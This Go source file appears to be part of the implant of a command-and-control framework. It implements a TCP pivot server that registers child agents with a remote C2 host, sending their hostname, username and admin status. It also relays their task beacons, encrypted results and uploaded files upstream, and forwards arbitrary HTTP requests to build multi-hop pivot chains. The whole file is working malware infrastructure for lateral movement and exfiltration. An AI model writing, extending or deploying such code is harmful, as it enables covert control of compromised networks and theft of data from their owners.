package agent

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"
)

type tcpPivotSession struct {
	agentID string
	aesKey  []byte // needed to synthesize empty beacon responses
}

type tcpPivotServer struct {
	ln     net.Listener
	client *http.Client
	stop   chan struct{}
	once   sync.Once
}

var (
	globalTCPPivots   = map[int]*tcpPivotServer{}
	globalTCPPivotsMu sync.Mutex
)

func startTCPPivot(port int) error {
	globalTCPPivotsMu.Lock()
	defer globalTCPPivotsMu.Unlock()
	if _, ok := globalTCPPivots[port]; ok {
		return fmt.Errorf("tcp pivot already running on :%d", port)
	}
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return err
	}
	tr := &http.Transport{}
	if ProxyURL != "" {
		if pu, err := url.Parse(ProxyURL); err == nil {
			tr.Proxy = http.ProxyURL(pu)
		}
	}
	ps := &tcpPivotServer{
		ln:     ln,
		client: &http.Client{Transport: tr, Timeout: 30 * time.Second},
		stop:   make(chan struct{}),
	}
	globalTCPPivots[port] = ps
	go ps.run()
	return nil
}

func stopTCPPivot(port int) string {
	globalTCPPivotsMu.Lock()
	defer globalTCPPivotsMu.Unlock()
	if port == 0 {
		if len(globalTCPPivots) == 0 {
			return "no tcp pivot servers running"
		}
		count := len(globalTCPPivots)
		for p, ps := range globalTCPPivots {
			ps.once.Do(func() { close(ps.stop); ps.ln.Close() })
			delete(globalTCPPivots, p)
		}
		return fmt.Sprintf("[+] stopped %d tcp pivot server(s)", count)
	}
	ps, ok := globalTCPPivots[port]
	if !ok {
		return fmt.Sprintf("no tcp pivot running on :%d", port)
	}
	ps.once.Do(func() { close(ps.stop); ps.ln.Close() })
	delete(globalTCPPivots, port)
	return fmt.Sprintf("[+] tcp pivot on :%d stopped", port)
}

func (ps *tcpPivotServer) run() {
	for {
		conn, err := ps.ln.Accept()
		if err != nil {
			select {
			case <-ps.stop:
				return
			default:
				time.Sleep(100 * time.Millisecond)
				continue
			}
		}
		go ps.handleConn(conn)
	}
}

func (ps *tcpPivotServer) handleConn(conn net.Conn) {
	defer conn.Close()

	// ── 1. Register ────────────────────────────────────────────────────────
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	frame, err := tcpReadFrame(conn)
	if err != nil {
		return
	}
	var msg tcpMsg
	if err := json.Unmarshal(frame, &msg); err != nil {
		return
	}
	// Pre-registration relay: a mesh fallback agent sends a single relay request
	// without needing a session. Forward it and close.
	if msg.Type == "relay" {
		ps.handleRelay(conn, msg)
		return
	}
	if msg.Type != "register" {
		return
	}

	var childReg registerRequest
	json.Unmarshal(msg.Payload, &childReg)

	regMap := map[string]any{
		"hostname":     childReg.Hostname,
		"username":     childReg.Username,
		"os":           childReg.OS,
		"pid":          childReg.PID,
		"transport":    "tcp",
		"sleep_sec":    childReg.SleepSec,
		"jitter_pct":   childReg.JitterPct,
		"process_name": childReg.ProcessName,
		"is_admin":     childReg.IsAdmin,
	}
	if GlobalAgentID != "" {
		regMap["parent_id"] = GlobalAgentID
	}
	regBody, _ := json.Marshal(regMap)

	status, regRespRaw, err := ps.doRequest("POST", "/register", regBody)
	if err != nil || status != 200 {
		return
	}

	var regResp registerResponse
	if err := json.Unmarshal(regRespRaw, &regResp); err != nil {
		return
	}
	aesKey, _ := base64.StdEncoding.DecodeString(regResp.AESKey)
	sess := &tcpPivotSession{agentID: regResp.AgentID, aesKey: aesKey}

	out, _ := json.Marshal(tcpMsg{Type: "register_resp", Payload: jsonRaw(regResp)})
	if err := tcpWriteFrame(conn, out); err != nil {
		return
	}
	conn.SetDeadline(time.Time{})

	// ── 2. Message loop ────────────────────────────────────────────────────
	for {
		conn.SetDeadline(time.Now().Add(10 * time.Minute))
		frame, err := tcpReadFrame(conn)
		if err != nil {
			return
		}
		if err := json.Unmarshal(frame, &msg); err != nil {
			return
		}
		switch msg.Type {
		case "beacon":
			ps.handleBeacon(conn, sess)
		case "result":
			ps.handleResult(conn, sess, msg)
		case "upload":
			ps.handleUpload(conn, sess, msg)
		case "relay":
			ps.handleRelay(conn, msg)
		}
	}
}

func (ps *tcpPivotServer) handleBeacon(conn net.Conn, sess *tcpPivotSession) {
	status, encrypted, err := ps.doRequest("GET", "/beacon/"+sess.agentID, nil)
	if err != nil || status == 204 || len(encrypted) == 0 {
		// No tasks — synthesize an empty encrypted tasks response
		plain, _ := json.Marshal(beaconResponse{Tasks: nil})
		enc, err := seal(sess.aesKey, plain)
		if err != nil {
			return
		}
		encB64 := base64.StdEncoding.EncodeToString(enc)
		out, _ := json.Marshal(tcpMsg{Type: "tasks", Payload: json.RawMessage(`"` + encB64 + `"`)})
		tcpWriteFrame(conn, out) //nolint:errcheck
		return
	}
	// Pass encrypted blob straight through — C2 already encrypted with child's AES key
	encB64 := base64.StdEncoding.EncodeToString(encrypted)
	out, _ := json.Marshal(tcpMsg{Type: "tasks", Payload: json.RawMessage(`"` + encB64 + `"`)})
	tcpWriteFrame(conn, out) //nolint:errcheck
}

func (ps *tcpPivotServer) handleResult(conn net.Conn, sess *tcpPivotSession, msg tcpMsg) {
	// msg.Payload is a JSON string containing base64(encrypted result)
	var encB64 string
	json.Unmarshal(msg.Payload, &encB64)
	enc, _ := base64.StdEncoding.DecodeString(encB64)
	// Forward raw encrypted bytes to C2 — the C2 decrypts with the agent's AES key
	ps.doRequest("POST", "/result/"+sess.agentID, enc)
	ack, _ := json.Marshal(tcpMsg{Type: "ack"})
	tcpWriteFrame(conn, ack) //nolint:errcheck
}

func (ps *tcpPivotServer) handleUpload(conn net.Conn, sess *tcpPivotSession, msg tcpMsg) {
	// msg.Payload is base64(encrypted JSON {task_id, filename, data_b64})
	var encB64 string
	json.Unmarshal(msg.Payload, &encB64)
	enc, _ := base64.StdEncoding.DecodeString(encB64)
	// Decrypt to read the filename, then re-POST the raw encrypted bytes
	plain, err := open(sess.aesKey, enc)
	if err != nil {
		ack, _ := json.Marshal(tcpMsg{Type: "ack"})
		tcpWriteFrame(conn, ack) //nolint:errcheck
		return
	}
	var ureq struct {
		TaskID   int64  `json:"task_id"`
		Filename string `json:"filename"`
		Data     string `json:"data"` // base64
	}
	json.Unmarshal(plain, &ureq)
	fileData, _ := base64.StdEncoding.DecodeString(ureq.Data)

	// POST the file to /upload/{agentID}?task_id=N&filename=F
	uploadURL := fmt.Sprintf("/upload/%s?task_id=%d&filename=%s", sess.agentID, ureq.TaskID, url.QueryEscape(ureq.Filename))
	ps.doRequest("POST", uploadURL, fileData) //nolint:errcheck

	ack, _ := json.Marshal(tcpMsg{Type: "ack"})
	tcpWriteFrame(conn, ack) //nolint:errcheck
}

// handleRelay forwards an arbitrary HTTP request upstream — enables N-hop TCP pivot chains.
// The child sends: {"method":"GET","path":"/beacon/...","body_b64":"..."}
func (ps *tcpPivotServer) handleRelay(conn net.Conn, msg tcpMsg) {
	var rr struct {
		Method  string `json:"method"`
		Path    string `json:"path"`
		BodyB64 string `json:"body_b64"`
	}
	json.Unmarshal(msg.Payload, &rr)
	body, _ := base64.StdEncoding.DecodeString(rr.BodyB64)

	status, respBody, err := ps.doRequest(rr.Method, rr.Path, body)
	if err != nil {
		status = 502
		respBody = nil
	}
	respPayload, _ := json.Marshal(map[string]any{
		"status":   status,
		"body_b64": base64.StdEncoding.EncodeToString(respBody),
	})
	out, _ := json.Marshal(tcpMsg{Type: "relay_resp", Payload: respPayload})
	tcpWriteFrame(conn, out) //nolint:errcheck
}

// doRequest forwards an HTTP request upstream.
// If the active transport supports rawForward (N-hop chain), use that;
// otherwise make a direct HTTP request to the C2 server.
func (ps *tcpPivotServer) doRequest(method, path string, body []byte) (int, []byte, error) {
	if rf, ok := activeTransport.(rawForwarder); ok {
		return rf.rawForward(method, path, body)
	}
	var bodyReader io.Reader
	if len(body) > 0 {
		bodyReader = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, ServerURL+path, bodyReader)
	if err != nil {
		return 0, nil, err
	}
	if method == "POST" && len(body) > 0 {
		req.Header.Set("Content-Type", "application/octet-stream")
	}
	if GlobalAgentID != "" {
		req.Header.Set("X-C2-Parent", GlobalAgentID)
	}
	resp, err := ps.client.Do(req)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, b, nil
}

// jsonRaw marshals v to json.RawMessage, ignoring errors.
func jsonRaw(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}
